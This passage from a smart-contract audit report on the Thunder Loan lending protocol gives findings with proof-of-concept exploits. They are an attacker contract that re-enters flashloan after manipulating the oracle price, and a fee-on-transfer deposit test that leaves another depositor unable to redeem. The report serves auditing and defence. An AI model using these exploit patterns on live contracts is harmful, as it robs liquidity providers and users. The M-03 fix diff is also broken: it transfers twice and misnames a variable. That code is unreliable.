    uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
    //slither-disable-next-line divide-before-multiply
    fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
}
```

`getCalculatedFee()` uses the function `OracleUpgradeable::getPriceInWeth` to calculate the price of a single underlying token in WETH:

```solidity
function getPriceInWeth(address token) public view returns (uint256) {
    address swapPoolOfToken = IPoolFactory(s_poolFactory).getPool(token);
    return ITSwapPool(swapPoolOfToken).getPriceOfOnePoolTokenInWeth();
}
```

This function gets the address of the token-WETH pool, and calls `TSwapPool::getPriceOfOnePoolTokenInWeth` on the pool. This function's behavior is dependent on the implementation of the `ThunderLoan::initialize` argument `tswapAddress` but it can be assumed to be a constant product liquidity pool similar to Uniswap. This means that the use of this price based on the pool reserves can be subject to price oracle manipulation.

If an attacker provides a large amount of liquidity of either WETH or the token, they can decrease/increase the price of the token with respect to WETH. If the attacker decreases the price of the token in WETH by sending a large amount of the token to the liquidity pool, at a certain threshold, the numerator of the following function will be minimally greater (not less than or the function will revert, see below) than `s_feePrecision`, resulting in a minimal value for `valueOfBorrowedToken`:

```solidity
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
```

Since a value of `0` for the `fee` would revert as `assetToken.updateExchangeRate(fee);` would revert since there is a check ensuring that the exchange rate increases, which with a `0` fee, the exchange rate would stay the same, hence the function will revert:

```solidity
function updateExchangeRate(uint256 fee) external onlyThunderLoan {
    // 1. Get the current exchange rate
    // 2. How big the fee is should be divided by the total supply
    // 3. So if the fee is 1e18, and the total supply is 2e18, the exchange rate be multiplied by 1.5
    // if the fee is 0.5 ETH, and the total supply is 4, the exchange rate should be multiplied by 1.125
    // it should always go up, never down
    // newExchangeRate = oldExchangeRate * (totalSupply + fee) / totalSupply
    // newExchangeRate = 1 (4 + 0.5) / 4
    // newExchangeRate = 1.125
    uint256 newExchangeRate = s_exchangeRate * (totalSupply() + fee) / totalSupply();

    // newExchangeRate = s_exchangeRate + fee/totalSupply();

    if (newExchangeRate <= s_exchangeRate) {
        revert AssetToken__ExhangeRateCanOnlyIncrease(s_exchangeRate, newExchangeRate);
    }
    s_exchangeRate = newExchangeRate;
    emit ExchangeRateUpdated(s_exchangeRate);
}
```

`flashloan()` can be reentered on [line 201-210](https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L201-L210):

```solidity
receiverAddress.functionCall(
    abi.encodeWithSignature(
        "executeOperation(address,uint256,uint256,address,bytes)",
        address(token),
        amount,
        fee,
        msg.sender,
        params
    )
);
```

This means that an attacking contract can perform an attack by:

1. Calling `flashloan()` with a sufficiently small value for `amount`
2. Reenter the contract and perform the price oracle manipulation by sending liquidity to the pool during the `executionOperation` callback
3. Re-calling `flashloan()` this time with a large value for `amount` but now the `fee` will be minimal, regardless of the size of the loan.
4. Returning the second and the first loans and withdrawing their liquidity from the pool ensuring that they only paid two, small `fees for an arbitrarily large loan.

## Impact

An attacker can reenter the contract and take a reduced-fee flash loan. Since the attacker is required to either:

1. Take out a flash loan to pay for the price manipulation: This is not financially beneficial unless the amount of tokens required to manipulate the price is less than the reduced fee loan. Enough that the initial fee they pay is less than the reduced fee paid by an amount equal to the reduced fee price.
2. Already owning enough funds to be able to manipulate the price: This is financially beneficial since the initial loan only needs to be minimally small.

The first option isn't financially beneficial in most circumstances and the second option is likely, especially for lower liquidity pools which are easier to manipulate due to lower capital requirements. Therefore, the impact is high since the liquidity providers should be earning fees proportional to the amount of tokens loaned. Hence, this is a high-severity finding.

## Proof of concept

### Working test case

The attacking contract implements an `executeOperation` function which, when called via the `ThunderLoan` contract, will perform the following sequence of function calls:

- Calls the mock pool contract to set the price (simulating manipulating the price)
- Repay the initial loan
- Re-calls `flashloan`, taking a large loan now with a reduced fee
- Repay second loan

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { SafeERC20 } from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import { IFlashLoanReceiver, IThunderLoan } from "../../src/interfaces/IFlashLoanReceiver.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import { MockTSwapPool } from "./MockTSwapPool.sol";
import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";

contract AttackFlashLoanReceiver {
    error AttackFlashLoanReceiver__onlyOwner();
    error AttackFlashLoanReceiver__onlyThunderLoan();

    using SafeERC20 for IERC20;

    address s_owner;
    address s_thunderLoan;

    uint256 s_balanceDuringFlashLoan;
    uint256 s_balanceAfterFlashLoan;

    uint256 public attackAmount = 1e20;
    uint256 public attackFee1;
    uint256 public attackFee2;
    address tSwapPool;
    IERC20 tokenA;

    constructor(address thunderLoan, address _tSwapPool, IERC20 _tokenA) {
        s_owner = msg.sender;
        s_thunderLoan = thunderLoan;
        s_balanceDuringFlashLoan = 0;
        tSwapPool = _tSwapPool;
        tokenA = _tokenA;
    }

    function executeOperation(
        address token,
        uint256 amount,
        uint256 fee,
        address initiator,
        bytes calldata params
    )
        external
        returns (bool)
    {
        s_balanceDuringFlashLoan = IERC20(token).balanceOf(address(this));

        // check if it is the first time through the reentrancy
        bool isFirst = abi.decode(params, (bool));

        if (isFirst) {
            // Manipulate the price
            MockTSwapPool(tSwapPool).setPrice(1e15);
            // repay the initial, small loan
            IERC20(token).approve(s_thunderLoan, attackFee1 + 1e6);
            IThunderLoan(s_thunderLoan).repay(address(tokenA), 1e6 + attackFee1);
            ThunderLoan(s_thunderLoan).flashloan(address(this), tokenA, attackAmount, abi.encode(false));
            attackFee1 = fee;
            return true;
        } else {
            attackFee2 = fee;
            // simulate withdrawing the funds from the price pool
           //MockTSwapPool(tSwapPool).setPrice(1e18);
            // repay the second, large low fee loan
            IERC20(token).approve(s_thunderLoan, attackAmount + attackFee2);
            IThunderLoan(s_thunderLoan).repay(address(tokenA), attackAmount + attackFee2);
            return true;
        }
    }

    function getbalanceDuring() external view returns (uint256) {
        return s_balanceDuringFlashLoan;
    }

    function getBalanceAfter() external view returns (uint256) {
        return s_balanceAfterFlashLoan;
    }
}

```

The following test first calls `flashloan()` with the attacking contract, the `executeOperation()` callback then executes the attack.

```solidity
function test_poc_smallFeeReentrancy() public setAllowedToken hasDeposits {
    uint256 price = MockTSwapPool(tokenToPool[address(tokenA)]).price();
    console.log("price before: ", price);
    // borrow a large amount to perform the price oracle manipulation
    uint256 amountToBorrow = 1e6;
    bool isFirstCall = true;
    bytes memory params = abi.encode(isFirstCall);

    uint256 expectedSecondFee = thunderLoan.getCalculatedFee(tokenA, attackFlashLoanReceiver.attackAmount());

    // Give the attacking contract reserve tokens for the price oracle manipulation & paying fees
    // For a less funded attacker, they could use the initial flash loan to perform the manipulation but pay a higher initial fee
    tokenA.mint(address(attackFlashLoanReceiver), AMOUNT);

    vm.startPrank(user);
    thunderLoan.flashloan(address(attackFlashLoanReceiver), tokenA, amountToBorrow, params);
    vm.stopPrank();
    assertGt(expectedSecondFee, attackFlashLoanReceiver.attackFee2());
    uint256 priceAfter = MockTSwapPool(tokenToPool[address(tokenA)]).price();
    console.log("price after: ", priceAfter);

    console.log("expectedSecondFee: ", expectedSecondFee);
    console.log("attackFee2: ", attackFlashLoanReceiver.attackFee2());
    console.log("attackFee1: ", attackFlashLoanReceiver.attackFee1());
}
```

```bash
$ forge test --mt test_poc_smallFeeReentrancy -vvvv

// output
Running 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] test_poc_smallFeeReentrancy() (gas: 1162442)
Logs:
  price before:  1000000000000000000
  price after:  1000000000000000
  expectedSecondFee:  300000000000000000
  attackFee2:  300000000000000
  attackFee1:  3000
Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.52ms
```

Since the test passed, the fee has been successfully reduced due to price oracle manipulation.

## Recommended mitigation

Use a manipulation-resistant oracle such as Chainlink.

## Tools used

- Forge

## <a id='M-03'></a>M-03. `ThunderLoan:: deposit` is not compatible with Fee tokens and could be exploited by draining other users funds, Making Other user Looses there deposit and yield

_Submitted by [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [pacelliv](/profile/clk45g5zs003smg08s6utu2a0), [alphabuddha1357](/profile/clnxv56t30004l6085wcq3syn), [nisedo](/profile/clk3saar60000l608gsamuvnw), [darksnow](/profile/clk80pzvl000yl608bqwqky5y), [ZedBlockchain](/profile/clk6kgukh0008ld088n5wns9l). Selected submission by: [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#147-156

## Summary
`deposit` function do not account the amount for fee tokens, which leads to minting more Asset tokens. These tokens can be used to claim more tokens of underlying asset then it's supposed to be.
## Vulnerability Details
Some ERC20 tokens have fees implemented like autoLP Fee, marketing fee etc. So when someone send say 100 tokens and fees 0.3%, then receiver will get only 99.7 tokens.

`Deposit` function mint the tokens that user has inputted in the params and mint the same amount of Asset token.
```solidity
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
   @>   uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        uint256 calculatedFee = getCalculatedFee(token, amount);
        assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

As you can see in highlighted line, It calculates the token amount based on `amount` rather actual token amount received by the contract. If any fees token is supplied to contract, then `redeem` function will revert (due to insufficient funds) or if there are multiple users who supplied this token, then some users won't be able to withdraw there underlying token ever.

## Proof of Concept
Token like `STA` and `PAXG` has fees on every transfer which means token receiver will receive less token amount than the amount being sent. Let's consider example of `STA` here which has 1% fees on every transfer. When user put 100 tokens as input, then contract will receive only 99 tokens, as 1% being goes to burn address (as per STA token contract design). User will be getting Asset token amount based on input amount.

```solidity
 uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
```

`Alice` initiate a transaction to call `deposit` with 1 million `STA`. `Attacker` notice the transaction and `deposit` 2 million `STA` before him. So contract will be receive 990,000 tokens from `Alice` and 198000 tokens from attacker.

Now attacker call withdraw the `STA` token using all Asset tokens amount he received while depositing. Attacker get's  1% more than he supposed to be, As fee is deducted from contract. Alice won't be able to claim her underlying amount that she supposed to be. It make more sense for attacker to call it, as token fee is being accrued to him. 

Here is given example in foundry where we set asset token which has 1% fees.
in `BaseTest.t.sol`
we import custom erc20 for underlying token creation which has 1% fees on transfers.

`CUSTOM MOCK TOKEN`

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20} from "../token/ERC20/ERC20.sol";

contract CustomERC20Mock is ERC20 {
    constructor() ERC20("ERC20Mock", "E20M") {}

    function mint(address account, uint256 amount) external {
        _mint(account, amount);
    }

    function burn(address account, uint256 amount) external {
        _burn(account, amount);
    }

    function _transfer(address from, address to, uint256 amount) internal override {
        _burn(from, amount/100);
        super._transfer(from, to, amount - (amount/100));
    }
}
```

updated `BaseTest.t.sol` file
```diff
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

  import { Test, console } from "forge-std/Test.sol";
  import { ThunderLoan } from "../../src/protocol/ThunderLoan.sol";
  import { ERC20Mock } from "@openzeppelin/contracts/mocks/ERC20Mock.sol";
  import { MockTSwapPool } from "../mocks/MockTSwapPool.sol";
  import { MockPoolFactory } from "../mocks/MockPoolFactory.sol";
+ import { CustomERC20Mock } from "../mocks/CustomERC20Mock.sol";
  import { ERC1967Proxy } from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract BaseTest is Test {
    ThunderLoan thunderLoanImplementation;
    MockPoolFactory mockPoolFactory;
    ERC1967Proxy proxy;
    ThunderLoan thunderLoan;

    ERC20Mock weth;
-   ERC20Mock tokenA;
+   CustomERC20Mock tokenA;

    function setUp() public virtual {
        thunderLoan = new ThunderLoan();
        mockPoolFactory = new MockPoolFactory();

        weth = new ERC20Mock();
-       tokenA = new ERC20Mock();
+       tokenA = new CustomERC20Mock();

        mockPoolFactory.createPool(address(tokenA));
        proxy = new ERC1967Proxy(address(thunderLoan), "");
        thunderLoan = ThunderLoan(address(proxy));
        thunderLoan.initialize(address(mockPoolFactory));
    }
}
```


```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import { Test, console2 } from "forge-std/Test.sol";
import { BaseTest, ThunderLoan } from "./BaseTest.t.sol";
import { AssetToken } from "../../src/protocol/AssetToken.sol";
import { MockFlashLoanReceiver } from "../mocks/MockFlashLoanReceiver.sol";

contract ThunderLoanTest is BaseTest {
    uint256 constant ALICE_AMOUNT = 1e7 * 1e18;
    uint256 constant ATTACKER_AMOUNT = 2e7 * 1e18;
    address attacker = address(789);
    address alice = address(0x123);
    MockFlashLoanReceiver mockFlashLoanReceiver;

    function setUp() public override {
        super.setUp();
        vm.prank(user);
        mockFlashLoanReceiver = new MockFlashLoanReceiver(address(thunderLoan));
    }

function testAttackerGettingMoreTokens() public setAllowedToken {
        tokenA.mint(attacker, ATTACKER_AMOUNT);
        tokenA.mint(alice, ALICE_AMOUNT);
        vm.startPrank(attacker);
        tokenA.approve(address(thunderLoan), ATTACKER_AMOUNT);
        /// First deposit in contract by attacker
        thunderLoan.deposit(tokenA, ATTACKER_AMOUNT);
        vm.stopPrank();
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);
        uint256 contractBalanceAfterAttackerDeposit = tokenA.balanceOf(address(asset));
        uint256 difference = ATTACKER_AMOUNT - contractBalanceAfterAttackerDeposit;
        uint256 attackerAssetTokenBalance = asset.balanceOf(attacker);
        console2.log(contractBalanceAfterAttackerDeposit, "Contract balance of token A after first deposit"); 
        console2.log(attackerAssetTokenBalance, "attacker balance of asset token");
        console2.log(difference, "difference b/w actual amount and deposited amount"); 

        
        vm.startPrank(alice);
        tokenA.approve(address(thunderLoan), ALICE_AMOUNT);
        thunderLoan.deposit(tokenA, ALICE_AMOUNT);
        vm.stopPrank();
        uint256 actualAmountDepositedByUser = tokenA.balanceOf(address(asset)) - contractBalanceAfterAttackerDeposit;
        console2.log(ALICE_AMOUNT, "Actual input by alice");
        console2.log(actualAmountDepositedByUser, "Actual balance Deposited by Alice"); 
        console2.log(tokenA.balanceOf(address(asset)), "thunderloan balance of Token A after Alice deposit");
        console2.log(asset.balanceOf(alice), "Alice Asset Token Balance");

        vm.startPrank(attacker);
        thunderLoan.redeem(tokenA, asset.balanceOf(attacker));
        console2.log(tokenA.balanceOf(attacker), "AttackerBalance"); // how much token he claimed
        vm.stopPrank();

        /// if alice try to claim her underlying tokens now, tx will fail as contract
        /// don't have enough funds

        vm.startPrank(alice);
        uint256 amountToClaim = asset.balanceOf(alice);
        vm.expectRevert(); 
        thunderLoan.redeem(tokenA, amountToClaim);
        vm.stopPrank();       

    }
}
```

run the following command in terminal `forge test --match-test testAttackerGettingMoreTokens() -vv`
it will return something like this-
```terminal
[⠒] Compiling...
[⠊] Compiling 1 files with 0.8.20
[⠒] Solc 0.8.20 finished in 1.94s
Compiler run successful!

Running 1 test for test/unit/ThunderLoanTest.t.sol:ThunderLoanTest
[PASS] testAttackerGettingMoreTokens() (gas: 1265386)
Logs:
  19800000000000000000000000 Contract balance of token A after first deposit
  20000000000000000000000000 attacker balance of asset token
  200000000000000000000000 difference b/w actual amount and deposited amount
  10000000000000000000000000 Actual input by alice
  9900000000000000000000000 Actual balance Deposited by Alice
  29700000000000000000000000 thunderloan balance of Token A after Alice deposit
  9970089730807577268195413 Alice Asset Token Balance
  19879279219760479041600000 AttackerBalance
```


## Impact
Loss of user funds
## Tools Used
Manual Review, Foundry
## Recommendations
Either Do not use fee tokens or implement correct accounting by checking the received balance and use that value for calculation.

```solidity
uint256 amountBefore = IERC20(token).balanceOf(address(this));
token.safeTransferFrom(msg.sender, address(assetToken), amount);
uint256 amountAfter = IERC20(token).balanceOf(address(this));
uint256 amount = AmountAfter - amountBefore;
```

deposit function can be written like this.
```diff
function deposit(IERC20 token, uint256 amount) external revertIfZero(amount) revertIfNotAllowedToken(token) {
        AssetToken assetToken = s_tokenToAssetToken[token];
        uint256 exchangeRate = assetToken.getExchangeRate();
+       uint256 amountBefore = IERC20(token).balanceOf(address(this));
+       token.safeTransferFrom(msg.sender, address(assetToken), amount);
+       uint256 amountAfter = IERC20(token).balanceOf(address(this));
+       uint256 amount = AmountAfter - amountBefore;
        uint256 mintAmount = (amount * assetToken.EXCHANGE_RATE_PRECISION()) / exchangeRate;
        emit Deposit(msg.sender, token, amount);
        assetToken.mint(msg.sender, mintAmount);
        uint256 calculatedFee = getCalculatedFee(token, amount);
-       assetToken.updateExchangeRate(calculatedFee);
        token.safeTransferFrom(msg.sender, address(assetToken), amount);
    }
```

# Low Risk Findings

## <a id='L-01'></a>L-01. getCalculatedFee can be 0

_Submitted by [BowTiedJerboa](/profile/cloc8261b001al208obsdjnwj), [0x6a70](/profile/clnupn4c20002mk08inaqc8is), [anarcheuz](/profile/clmrussuq0008l008ao5w04v1). Selected submission by: [0x6a70](/profile/clnupn4c20002mk08inaqc8is)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L246

## Summary
getCalculatedFee can be as low as 0
## Vulnerability Details
Any value up to 333 for "amount" can result in 0 fee based on calculation
```
    function testFuzzGetCalculatedFee() public {
        AssetToken asset = thunderLoan.getAssetFromToken(tokenA);

        uint256 calculatedFee = thunderLoan.getCalculatedFee(
            tokenA,
            333
        );

        assertEq(calculatedFee ,0);

        console.log(calculatedFee);
    }
```
## Impact
Low as this amount is really small
## Tools Used
Foundry, Manual review
## Recommendations
A minimum fee can be used to offset the calculation, though it is not that important.
## <a id='L-02'></a>L-02. updateFlashLoanFee() missing event

_Submitted by [uba7](/profile/cllina1ss0000jt08ols0vdm7), [alphabuddha1357](/profile/clnxv56t30004l6085wcq3syn), [Charalab0ts](/profile/clnvg04ao0000mi08o5ui3i8u), [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l), [DuncanDuMond](/profile/clnzr98ch0000mg08irvcdl92), [nisedo](/profile/clk3saar60000l608gsamuvnw), [kanastasoff](/profile/clobfwqy2000il508l56i294o), [Ciara](/profile/clnvs09md0006jx08tmvz0w19), [Arie71](/profile/clnud7mxo0000l408ex25njv8), [lian886](/profile/clk6rtfkx0008mn083rima8eb). Selected submission by: [KiteWeb3](/profile/clk9pzw3j000smh08313lj91l)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/8539c83865eb0d6149e4d70f37a35d9e72ac7404/src/protocol/ThunderLoan.sol#L257

## Summary
```ThunderLoan::updateFlashLoanFee()``` and ```ThunderLoanUpgraded::updateFlashLoanFee()``` does not emit an event, so it is difficult to track changes in the value ```s_flashLoanFee``` off-chain.

## Vulnerability Details
```solidity
function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > FEE_PRECISION) {
            revert ThunderLoan__BadNewFee();
        }
@>        s_flashLoanFee = newFee;
    }
```

## Impact
In Ethereum, events are used to facilitate communication between smart contracts and their user interfaces or other off-chain services. When an event is emitted, it gets logged in the transaction receipt, and these logs can be monitored and reacted to by off-chain services or user interfaces.

Without a ```FeeUpdated``` event, any off-chain service or user interface that needs to know the current ```s_flashLoanFee``` would have to actively query the contract state to get the current value. This is less efficient than simply listening for the ```FeeUpdated``` event, and it can lead to delays in detecting changes to the ```s_flashLoanFee```.

The impact of this could be significant because the ```s_flashLoanFee``` is used to calculate the cost of the flash loan. If the fee changes and an off-chain service or user is not aware of the change because they didn't query the contract state at the right time, they could end up paying a different fee than they expected.

## Tools Used
Slither

## Recommendations
Emit an event for critical parameter changes.

```diff
+ event FeeUpdated(uint256 indexed newFee);

  function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > s_feePrecision) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
+        emit FeeUpdated(s_flashLoanFee);
    }
```
## <a id='L-03'></a>L-03. Mathematic Operations Handled Without Precision in getCalculatedFee() Function in ThunderLoan.sol

_Submitted by [benbo](/profile/clo4tx3kj0000l808q2ug31l8), [matthu](/profile/clnukaeq80004lc08xdy9jw90), [kanastasoff](/profile/clobfwqy2000il508l56i294o), [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n), [0xspryon](/profile/clo19fw280000mf08c4yazene). Selected submission by: [CodeLock](/profile/clo3l5kyo0000mk08r3no7q4n)._      
				
### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-11-Thunder-Loan/blob/main/src/protocol/ThunderLoan.sol#L246

## Summary

In a manual review of the ThunderLoan.sol contract, it was discovered that the mathematical operations within the getCalculatedFee() function do not handle precision appropriately. Specifically, the calculations in this function could lead to precision loss when processing fees. This issue is of low priority but may impact the accuracy of fee calculations.

## Vulnerability Details

The identified problem revolves around the handling of mathematical operations in the getCalculatedFee() function. The code snippet below is the source of concern:

```
uint256 valueOfBorrowedToken = (amount * getPriceInWeth(address(token))) / s_feePrecision;
fee = (valueOfBorrowedToken * s_flashLoanFee) / s_feePrecision;
```

The above code, as currently structured, may lead to precision loss during the fee calculation process, potentially causing accumulated fees to be lower than expected.

## Impact

This issue is assessed as low impact. While the contract continues to operate correctly, the precision loss during fee calculations could affect the final fee amounts. This discrepancy may result in fees that are marginally different from the expected values.

## Tools Used

Manual Review

## Recommendations

To mitigate the risk of precision loss during fee calculations, it is recommended to handle mathematical operations differently within the getCalculatedFee() function. One of the following actions should be taken:

Change the order of operations to perform multiplication before division. This reordering can help maintain precision.
Utilize a specialized library, such as math.sol, designed to handle mathematical operations without precision loss.
By implementing one of these recommendations, the accuracy of fee calculations can be improved, ensuring that fees align more closely with expected values.




